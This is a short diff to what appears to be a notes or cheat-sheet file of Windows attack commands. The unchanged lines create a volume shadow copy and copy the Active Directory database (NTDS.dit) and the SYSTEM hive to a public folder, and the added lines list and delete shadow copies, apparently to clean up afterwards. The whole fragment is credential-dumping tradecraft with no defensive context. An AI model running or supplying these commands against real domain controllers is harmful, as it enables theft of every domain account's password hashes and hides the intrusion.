@@ -4,3 +4,6 @@ vssadmin create shadow /for=C:
 
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\users\public\desktop\
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\users\public\desktop\
+
+vssadmin List shadows
+vssadmin Delete Shadows /shadow={Shadow Copy ID}
